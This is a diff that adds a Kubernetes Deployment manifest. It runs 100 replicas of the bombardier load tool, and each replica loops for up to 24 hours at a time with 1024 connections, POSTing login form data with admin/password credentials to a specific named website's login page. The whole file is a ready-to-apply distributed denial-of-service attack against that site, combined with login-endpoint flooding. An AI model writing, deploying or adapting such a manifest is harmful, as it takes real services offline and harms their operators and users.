@@ -1,0 +1,22 @@
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+    labels:
+        app: mironline-ru-mirconf
+    name: mironline-ru-mirconf
+spec:
+    replicas: 100
+    selector:
+        matchLabels:
+            app: mironline-ru-mirconf
+    template:
+        metadata:
+            labels:
+                app: mironline-ru-mirconf
+        spec:
+            containers:
+                -   name: bombardier
+                    image: alpine/bombardier
+                    imagePullPolicy: IfNotPresent
+                    command: ['/bin/sh']
+                    args: ['-c', 'for run in $(seq 1 100000); do bombardier --connections=1024 --duration=24h --method=POST --body="AUTH_FORM=Y&TYPE=AUTH&USER_LOGIN=admin&USER_PASSWORD=password" --header="Content-Type: application/x-www-form-urlencoded" "https://mironline.ru/mirconf/?login=yes"; done']
